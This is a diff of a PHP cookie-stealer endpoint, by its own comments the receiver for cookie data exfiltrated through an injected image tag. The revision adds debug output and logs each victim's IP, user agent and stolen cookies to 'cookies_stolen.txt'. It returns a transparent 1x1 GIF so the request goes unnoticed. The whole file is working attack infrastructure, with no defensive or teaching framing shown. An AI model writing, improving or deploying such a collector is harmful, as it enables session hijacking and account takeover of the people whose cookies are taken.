@@ -1,21 +1,19 @@
 <?php
-// This script captures the cookie data sent via the Image tag
-// File name: log.php
+// Debug version: show errors and log all requests
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
 
-$file = 'cookies_stolen.txt';
-
-// Get the 'c' parameter (cookie data)
+$file = __DIR__ . '/cookies_stolen.txt';
 $cookieData = $_GET['c'] ?? '';
 
-if ($cookieData) {
-    // Append the data to a file
-    $entry = date('Y-m-d H:i:s') . " | IP: " . $_SERVER['REMOTE_ADDR'] . " | DATA: " . $cookieData . "\n";
-    file_put_contents($file, $entry, FILE_APPEND);
-    
-    // Return a 1x1 pixel transparent image to avoid breaking the page visually
-    header('Content-Type: image/gif');
-    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
+$entry = date('c') . ' | IP: ' . $_SERVER['REMOTE_ADDR'] . ' | UA: ' . ($_SERVER['HTTP_USER_AGENT'] ?? '-') . ' | DATA: ' . $cookieData . "\n";
+
+if (file_put_contents($file, $entry, FILE_APPEND | LOCK_EX) === false) {
+    http_response_code(500);
+    echo "Failed to write to $file. Check permissions.";
 } else {
+    // Return a 1x1 transparent GIF
     header('Content-Type: image/gif');
     echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
 }
